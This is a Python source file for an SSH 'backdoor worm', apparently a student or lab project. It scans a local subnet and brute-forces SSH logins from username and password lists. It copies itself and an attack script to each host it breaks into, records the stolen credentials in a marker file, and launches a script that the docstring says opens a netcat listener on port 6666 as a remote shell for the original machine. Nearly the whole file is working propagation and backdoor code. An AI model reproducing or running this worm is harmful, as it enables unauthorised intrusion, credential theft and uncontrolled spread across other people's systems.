""" Backdoor Worm. Infects target system and sets up a netcat listener 
    usage: python <worm.py> <local_attack.py> <marker_file> <username_file> <password_file>  
    Backdoor port: 6666 (spooky)
    Utility used:  netcat
    Goal
        1. Report back to initial system each time a system is infected
        2. Provide initial system with access to a remote shell for each infection  """
import os
import sys
from SSHConnection import SSHConnection
from SSHConnection import get_local_ip

def transfer_file(worm, malicious_file):
    """ Transfers a malicious file, must be in same directory as current script """
    sftp_client = worm.ssh_connection.open_sftp()
    sftp_client.chdir(worm.target_dir)
    sftp_client.put(malicious_file, malicious_file)
    sftp_client.chmod(malicious_file, 777)


def launch_attack(worm, malicious_file):
    """ Sends signal to program to call another python file that will do all the bad stuff locally
        so that the worm isn't stuck doing it all through ssh commands. """
    #worm.ssh_connection.exec_command("python " + worm.target_dir + malicious_file +
    #                                 " " + worm.target_dir)
    worm.ssh_connection.exec_command("python local_backdoor.py")

def main():
    """ Main function that does all the heavy lifting. Very similar to replicator
        usage: python <worm.py> <local_attack.py> <username_file> <password_file> """ 
    worm = SSHConnection()
    initial_ip = "192.168.1.4"

    #### File Reference ########## #
    # current_script = sys.argv[0]
    # local_attacker = sys.argv[1]
    # marker_file = sys.argv[2]    ## hardcoded as "info.txt" in local_backdoor.py
    # username_file = sys.argv[3]
    # password_file = sys.argv[4]
    # ############################ #
    files = []
    for filename in sys.argv:
        files.append(filename)
    files.append("SSHConnection.py")

    worm.set_worm_file(files[0])
    worm.set_username_file(files[2])
    worm.set_password_file(files[3])   
    # Create worm instance and search first 10 ips on the network
    worm.retrieve_vulnerable_hosts("192.168.1.", 10)
    try:
        worm.vulnerable_hosts.remove(get_local_ip())
    except ValueError as host_not_found:
        pass
    # Set the file the worm will look for on the target system
    marker_file = "info.txt"
    worm.set_worm_file(marker_file)
    if worm.find_target_host():
        # Found an unmarked host, copy the files over to it.
        worm.set_target_dir("/home/" + worm.username + "/")
        for filename in files:
            transfer_file(worm, filename)
        print ("[+] Completed! Launching local attack now...")
        worm.ssh_connection.exec_command("echo " + initial_ip + " >> " + marker_file)
        worm.ssh_connection.exec_command("echo " + worm.username + " >> " + marker_file)
        worm.ssh_connection.exec_command("echo " + worm.password + " >> " + marker_file)
        launch_attack(worm, sys.argv[1])
    else:
        print (" :( No target found, better get a job! ")

if __name__ == "__main__":
    main()
